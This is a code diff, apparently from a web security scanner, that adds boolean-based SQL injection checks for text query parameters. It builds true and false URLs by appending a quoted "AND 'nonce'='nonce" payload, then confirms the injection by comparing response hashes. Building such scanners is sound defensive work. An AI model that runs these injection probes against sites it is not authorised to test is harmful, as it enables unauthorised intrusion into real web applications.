@@ -46,6 +46,36 @@ def plan_numeric_boolean(private_exchange: bytes, *, parameter: str,
     return baseline, variant(int(nonce)), variant(int(nonce) + 1), nonce
 
 
+def plan_text_boolean(private_exchange: bytes, *, parameter: str,
+                      allowed_origins: list[str]) -> tuple[str, str, str, str]:
+    """Build paired quoted-string conditions from one observed GET field."""
+    baseline, _ = plan_observed_query(
+        private_exchange, parameter=parameter, allowed_origins=allowed_origins,
+    )
+    parts = urlsplit(baseline)
+    fields = parts.query.split("&")
+    matches = [index for index, field in enumerate(fields)
+               if field and unquote_plus(field.split("=", 1)[0]) == parameter]
+    if len(matches) != 1:
+        raise ValueError("Text parameter must occur exactly once")
+    index = matches[0]
+    name, separator, raw_value = fields[index].partition("=")
+    value = unquote_plus(raw_value) if separator else ""
+    if not value or len(value) > 80 or re.fullmatch(r"[1-9][0-9]{0,8}", value):
+        raise ValueError("Boolean text SQLi proof requires a bounded observed string value")
+    nonce = str(secrets.randbelow(90000) + 10000)
+
+    def variant(other: int) -> str:
+        changed = fields.copy()
+        changed[index] = (
+            name + "=" + raw_value + "%27%20AND%20%27"
+            + nonce + "%27%3D%27" + str(other)
+        )
+        return urlunsplit(parts._replace(query="&".join(changed)))
+
+    return baseline, variant(int(nonce)), variant(int(nonce) + 1), nonce
+
+
 def numeric_sql_proof_valid(result: dict) -> bool:
     if result.get("operation") != "sqli_boolean_numeric" or result.get("proof_recipe") != "numeric_and_boolean_v1":
         return False
@@ -68,6 +98,16 @@ def numeric_sql_proof_valid(result: dict) -> bool:
     return hashes[0] == hashes[1] == hashes[3] == hashes[5] and hashes[2] == hashes[4] and hashes[2] != hashes[0]
 
 
+def text_sql_proof_valid(result: dict) -> bool:
+    if (result.get("operation") != "sqli_boolean_text"
+            or result.get("proof_recipe") != "quoted_text_boolean_v1"):
+        return False
+    return numeric_sql_proof_valid({
+        **result, "operation": "sqli_boolean_numeric",
+        "proof_recipe": "numeric_and_boolean_v1",
+    })
+
+
 def probe_numeric_boolean(baseline: str, true_url: str, false_url: str, nonce: str, *,
                           parameter: str, allowed_origins: list[str], storage_state: dict | None,
                           before_request: Callable[[], object]) -> dict:
@@ -88,4 +128,17 @@ def probe_numeric_boolean(baseline: str, true_url: str, false_url: str, nonce: s
         "identity_transport": "named_identity_cookies_only", "checks": checks,
     }
     result["proof_confirmed"] = numeric_sql_proof_valid(result)
+    return result
+
+
+def probe_text_boolean(baseline: str, true_url: str, false_url: str, nonce: str, *,
+                       parameter: str, allowed_origins: list[str], storage_state: dict | None,
+                       before_request: Callable[[], object]) -> dict:
+    result = probe_numeric_boolean(
+        baseline, true_url, false_url, nonce, parameter=parameter,
+        allowed_origins=allowed_origins, storage_state=storage_state,
+        before_request=before_request,
+    )
+    result.update(operation="sqli_boolean_text", proof_recipe="quoted_text_boolean_v1")
+    result["proof_confirmed"] = text_sql_proof_valid(result)
     return result
